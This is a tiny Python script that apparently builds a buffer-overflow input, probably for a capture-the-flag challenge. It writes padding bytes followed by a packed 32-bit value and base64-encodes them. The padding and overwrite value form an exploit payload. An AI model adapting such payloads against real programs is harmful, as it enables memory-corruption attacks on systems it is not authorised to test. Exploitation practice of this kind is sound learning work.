
import sys
import struct
import base64

buf = b'iiiiiiiiiiiii'
buf += struct.pack('<I', 2660606471)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
